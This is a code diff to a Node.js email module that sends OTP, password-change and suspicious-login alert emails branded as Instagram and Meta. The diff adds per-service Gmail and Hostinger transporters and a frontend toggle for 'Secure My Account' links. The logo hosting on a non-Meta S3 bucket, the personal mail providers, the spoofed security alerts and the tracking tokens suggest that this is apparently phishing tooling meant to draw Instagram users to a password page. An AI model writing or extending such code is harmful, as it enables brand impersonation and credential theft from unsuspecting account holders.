@@ -1,27 +1,28 @@
 const nodemailer = require('nodemailer');
 const jwt        = require('jsonwebtoken');
-const BRAND      = require('../config/brand');
+const { BRAND }  = require('../config/brand');
 
-/** Lazily-created singleton transporter. Call resetTransporter() if credentials change. */
-let _transporter = null;
+/** Singleton transporters keyed by service: { gmail: ..., hostinger: ... } */
+const _transporters = {};
 
-function resetTransporter() {
-  _transporter = null;
+function resetTransporter(service) {
+  if (service) delete _transporters[service];
+  else { delete _transporters['gmail']; delete _transporters['hostinger']; }
 }
 
 // ══════════════════════════════════════════════════════════════════════════════
 // CENTRALIZED EMAIL CONFIGURATION
 // ══════════════════════════════════════════════════════════════════════════════
 const EMAIL_CONFIG = {
-  get FROM_NAME()   { return BRAND.FROM_NAME; },
-  get FROM_EMAIL()  { return BRAND.EMAIL; },
-  get REPLY_TO()    { return BRAND.REPLY_TO; },
-  get BRAND_NAME()  { return BRAND.NAME; },
-  get COMPANY()     { return BRAND.COMPANY; },
-  get ADDRESS()     { return BRAND.ADDRESS; },
-  get SUPPORT_URL() { return BRAND.SUPPORT_URL; },
+  getFromName()            { return BRAND.FROM_NAME; },
+  getFromEmail(service)    { return BRAND.getEmail(service); },
+  getReplyTo(service)      { return BRAND.getReplyTo(service); },
+  get BRAND_NAME()         { return BRAND.NAME; },
+  get COMPANY()            { return BRAND.COMPANY; },
+  get ADDRESS()            { return BRAND.ADDRESS; },
+  get SUPPORT_URL()        { return BRAND.SUPPORT_URL; },
 
-  get COMMON_HEADERS() {
+  getCommonHeaders(service) {
     return {
       'X-Priority':               '1',
       'X-MSMail-Priority':        'High',
@@ -39,46 +40,43 @@ const INSTA_LOGO_URL = 'https://instagram-support.s3.ap-south-1.amazonaws.com/in
 const META_LOGO_URL  = 'https://instagram-support.s3.ap-south-1.amazonaws.com/meta-email-logo.png';
 
 /**
- * Get configured SMTP transporter
+ * Get configured SMTP transporter for a given service
  */
-function getTransporter() {
-  if (_transporter) return _transporter;
+function getTransporter(service = 'gmail') {
+  if (_transporters[service]) return _transporters[service];
 
-  _transporter = nodemailer.createTransport({
-    host:   BRAND.SMTP_HOST,
-    port:   BRAND.SMTP_PORT,
-    secure: BRAND.SMTP_SECURE,
+  _transporters[service] = nodemailer.createTransport({
+    host:   BRAND.getSmtpHost(service),
+    port:   BRAND.getSmtpPort(service),
+    secure: BRAND.getSmtpSecure(service),
     auth: {
-      user: BRAND.EMAIL,
-      pass: BRAND.PASSWORD,
+      user: BRAND.getEmail(service),
+      pass: BRAND.getPassword(service),
     },
     connectionTimeout: 10000,
     greetingTimeout:   10000,
     socketTimeout:     15000,
-    tls: {
-      rejectUnauthorized: true,
-      minVersion: 'TLSv1.2'
-    }
+    tls: { rejectUnauthorized: true, minVersion: 'TLSv1.2' }
   });
 
-  return _transporter;
+  return _transporters[service];
 }
 
 /**
  * Create standardized mail options with anti-spam headers
  */
-function createMailOptions(to, subject, html, text, uniqueId = 'MSG') {
-  const encodedName = `=?UTF-8?B?${Buffer.from(EMAIL_CONFIG.FROM_NAME).toString('base64')}?=`;
+function createMailOptions(to, subject, html, text, uniqueId = 'MSG', service = 'gmail') {
+  const encodedName = `=?UTF-8?B?${Buffer.from(EMAIL_CONFIG.getFromName()).toString('base64')}?=`;
   const msgId = `${uniqueId}-${Date.now()}-${Math.random().toString(36).substring(7)}`;
   return {
-    from:    `${encodedName} <${EMAIL_CONFIG.FROM_EMAIL}>`,
-    replyTo: EMAIL_CONFIG.REPLY_TO,
+    from:    `${encodedName} <${EMAIL_CONFIG.getFromEmail(service)}>`,
+    replyTo: EMAIL_CONFIG.getReplyTo(service),
     to,
     subject,
     html,
     text,
     headers: {
-      ...EMAIL_CONFIG.COMMON_HEADERS,
+      ...EMAIL_CONFIG.getCommonHeaders(service),
       'X-Entity-Ref-ID': msgId,
       'Message-ID':      `<${msgId}@${EMAIL_CONFIG.BRAND_NAME.toLowerCase()}.com>`,
     }
@@ -146,8 +144,8 @@ function htmlWrapper(title) {
 // ─────────────────────────────────────────────────────────────────────────────
 // EMAIL 1 — OTP / Forgot password
 // ─────────────────────────────────────────────────────────────────────────────
-async function sendOtpEmail(to, otp) {
-  const transporter = getTransporter();
+async function sendOtpEmail(to, otp, service = 'gmail') {
+  const transporter = getTransporter(service);
   const B = EMAIL_CONFIG;
 
   console.log('📧 Preparing OTP email for:', to);
@@ -188,7 +186,7 @@ async function sendOtpEmail(to, otp) {
 
   const text = `Hi,\n\nWe received a request to reset the password for your ${B.BRAND_NAME} account ${to}. Enter the confirmation code below:\n\n${otp}\n\n© ${B.BRAND_NAME}. ${B.COMPANY} · ${B.ADDRESS}\nThis message was sent to ${to}`;
 
-  const mailOptions = createMailOptions(to, subject, html, text, 'OTP');
+  const mailOptions = createMailOptions(to, subject, html, text, 'OTP', service);
 
   console.log('📤 Sending OTP email...');
   try {
@@ -204,8 +202,8 @@ async function sendOtpEmail(to, otp) {
 // ─────────────────────────────────────────────────────────────────────────────
 // EMAIL 2 — Password changed confirmation
 // ─────────────────────────────────────────────────────────────────────────────
-async function sendPasswordChangedEmail(to, username = '') {
-  const transporter = getTransporter();
+async function sendPasswordChangedEmail(to, username = '', service = 'gmail') {
+  const transporter = getTransporter(service);
   const B = EMAIL_CONFIG;
   const displayName = username || to;
 
@@ -240,7 +238,7 @@ async function sendPasswordChangedEmail(to, username = '') {
 
   const text = `Hi ${displayName},\n\nYour ${B.BRAND_NAME} password was successfully changed.\n\nIf you didn't make this change, please contact support immediately at ${B.SUPPORT_URL}\n\n© ${B.BRAND_NAME}. ${B.COMPANY} · ${B.ADDRESS}\nThis message was sent to ${to}`;
 
-  const mailOptions = createMailOptions(to, subject, html, text, 'PWD');
+  const mailOptions = createMailOptions(to, subject, html, text, 'PWD', service);
 
   console.log('📤 Sending password changed email...');
   try {
@@ -256,8 +254,8 @@ async function sendPasswordChangedEmail(to, username = '') {
 // ─────────────────────────────────────────────────────────────────────────────
 // EMAIL 3-6 — Security alert (simple + advance, both notification types)
 // ─────────────────────────────────────────────────────────────────────────────
-async function sendSecurityAlertEmail(to, username = '', notificationType = 'Someone tried to sign in', deviceName = '', location = '', type = 'simple', avatar = '', logId = '') {
-  const transporter = getTransporter();
+async function sendSecurityAlertEmail(to, username = '', notificationType = 'Someone tried to sign in', deviceName = '', location = '', type = 'simple', avatar = '', logId = '', emailService = 'gmail', linksEnabled = false) {
+  const transporter = getTransporter(emailService);
   const B = EMAIL_CONFIG;
 
   const now = new Date();
@@ -272,10 +270,9 @@ async function sendSecurityAlertEmail(to, username = '', notificationType = 'Som
   const emailLink   = `<a href="mailto:${to}" style="color:#385898;text-decoration:none;font-weight:500;">${to}</a>`;
   const displayName = username || to.split('@')[0];
 
-  // Build change password URL only when LINKS=true
-  // All data encrypted into a single JWT token — no raw params exposed
+  // Build change password URL only when linksEnabled=true (passed from frontend toggle)
   let changePasswordUrl = null;
-  if (BRAND.LINKS_ENABLED) {
+  if (linksEnabled) {
     const token = jwt.sign(
       { email: to, username: username || '', logId: logId || '', source: 'email' },
       process.env.JWT_SECRET,
@@ -377,7 +374,7 @@ async function sendSecurityAlertEmail(to, username = '', notificationType = 'Som
     ? `We've noticed a new login to your ${B.BRAND_NAME} account ${to} from a device that you don't usually use.`
     : `We've noticed a login attempt to your ${B.BRAND_NAME} account ${to} from a device that you don't usually use.`}\n\n• Device: ${deviceInfo}\n• Location: ${locationInfo}\n• Time: ${dateStr} at ${timeStr}\n\nIf this wasn't you, please secure your account right away.${changePasswordUrl ? `\n\nSecure My Account: ${changePasswordUrl}` : ''}\n\n© ${B.BRAND_NAME}. ${B.COMPANY} · ${B.ADDRESS}\nThis message was sent to ${to}`;
 
-  const mailOptions = createMailOptions(to, subject, html, text, 'SEC');
+  const mailOptions = createMailOptions(to, subject, html, text, 'SEC', emailService);
 
   console.log('📤 Sending security notification email...');
   try {
